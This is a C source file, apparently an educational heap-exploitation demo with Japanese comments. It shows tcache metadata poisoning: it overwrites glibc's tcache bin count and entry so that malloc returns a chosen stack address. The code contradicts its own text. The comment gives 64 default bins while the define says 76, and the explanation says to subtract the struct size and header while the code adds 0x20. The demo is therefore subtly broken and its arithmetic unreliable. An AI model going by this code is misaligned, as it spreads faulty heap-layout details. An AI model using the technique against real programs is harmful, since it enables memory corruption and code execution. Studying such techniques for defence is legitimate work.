#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// Tcache metadata poisoning 攻撃
// ================================
//
// tcache のメタデータ(metadata)を制御できると、攻撃者は悪意のある
// ポインタを tcache の bin に挿入できます。このポインタは、適切なサイズの
// チャンクを確保することで、簡単に取得できます。

// デフォルトでは tcache の bin は 64 個あります
#define TCACHE_BINS 76
// ヒープのチャンクのヘッダのサイズは 0x10 バイトです
#define HEADER_SIZE 0x10

// これが `tcache_perthread_struct`(tcache のメタデータ)です
struct tcache_metadata {
  uint16_t counts[TCACHE_BINS];
  void *entries[TCACHE_BINS];
};

int main() {
  // バッファリングを無効にします
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  uint64_t stack_target __attribute__ ((aligned (0x10))) = 0x1337;

  puts("この例は、tcache のメタデータのチャンクを制御することで、\n"
       "攻撃者が何を実現できるかを示します。\n");
  puts("まず、スタックを初期化するためにチャンクを確保する必要があります。このチャンクは、\n"
       "メタデータのチャンクのベースを計算するための\n"
       "相対オフセットとしても使われます。");
  uint64_t *victim = malloc(0x10);
  printf("被害者のチャンクは次の位置にあります: %p。\n\n", victim);
  puts("これを解放すると、ヒープ上にメタデータが確保されます");
  free(victim);

  printf("次に、メタデータ構造体のベースアドレスを計算する必要があります。\n"
         "メタデータ構造体自体のサイズは %#lx バイトです。さらに、\n"
         "被害者のチャンクのヘッダ分(追加で 0x10 バイト)\n"
         "も引く必要があります。\n",
         sizeof(struct tcache_metadata));
  struct tcache_metadata *metadata =
      (struct tcache_metadata *)((long)victim + 2*HEADER_SIZE);
  printf("tcache のメタデータは %p にあります。\n\n", metadata);

  puts("ここで、メタデータ構造体を操作して、ターゲットのアドレスを\n"
       "チャンクとして挿入します。ここでは 2 番目の tcache bin を選びます。\n");
  metadata->counts[1] = 6;
  metadata->entries[1] = &stack_target;

  uint64_t *evil = malloc(0x20);
  printf("最後に、サイズ 0x20 のチャンクを malloc します。これは\n"
         "2 番目の tcache bin に対応します。返されるポインタは %p です。\n",
         evil);
  assert(evil == &stack_target);
}
